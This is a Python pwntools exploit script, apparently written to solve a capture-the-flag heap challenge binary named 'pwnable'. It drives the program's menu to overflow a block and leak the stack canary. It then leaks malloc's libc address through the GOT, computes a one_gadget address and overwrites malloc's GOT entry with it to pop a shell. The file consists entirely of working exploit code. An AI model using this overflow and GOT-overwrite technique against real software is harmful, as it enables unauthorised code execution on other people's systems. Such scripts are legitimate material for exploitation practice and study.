from pwn import *

#context.log_level = "debug"
e = ELF("./pwnable")

def startProcess():
	p = process("./pwnable")
#	gdb.attach(p,'''b * 0x400e4b
#			b * 0x400deb
#			c''')
	return p


def getMenu(p):
	p.recvuntil('> ')

def createBlock(p,size):
	getMenu(p)
	p.sendline('1')
	p.recvline()
	p.sendline(str(size))

def writeBlock(p,index,size,data):
	getMenu(p)
	p.sendline('3')
	p.recvline()
	p.sendline(str(index))
	p.recvline()
	p.sendline(str(size))
	p.clean()
	p.sendline(data)


def printBlock(p,index):
        getMenu(p)
	p.sendline('2')
	p.recvline()
	p.sendline(str(index))
	resp = p.recvline()

	return resp


def pwn(p):
	data = ""

	createBlock(p,0x10)

	data = "A" * 0x10 + "\x50"

	writeBlock(p,0, 0x11, data)

	leak = printBlock(p,0)

	canary = u32(leak[24:28])

	log.info("Canary : " + hex(canary))

	data = "A" * 0x10 + p32(0x50) + p32(0x00) + p32(canary) + p32(0x00) + p64(e.got['malloc'])

	writeBlock(p,0, len(data), data)

	resp = printBlock(p,0)

	libc_malloc = u64(resp[0:8])

	libc_base_offset = 0x84130

	libc_base = libc_malloc - libc_base_offset

	one_gadget_offset = 0x45216

	one_gadget = libc_base + one_gadget_offset

        log.info("libc_malloc : " + hex(libc_malloc))

        log.info("libc_base : " + hex(libc_base))

	log.info("one_gadget : " + hex(one_gadget))

	data = p64(one_gadget)

	writeBlock(p,0,len(data),data)

	log.info("Game over")

	createBlock(p,0x10)

def main():
	p = startProcess()
	pwn(p)
	p.interactive()



main()

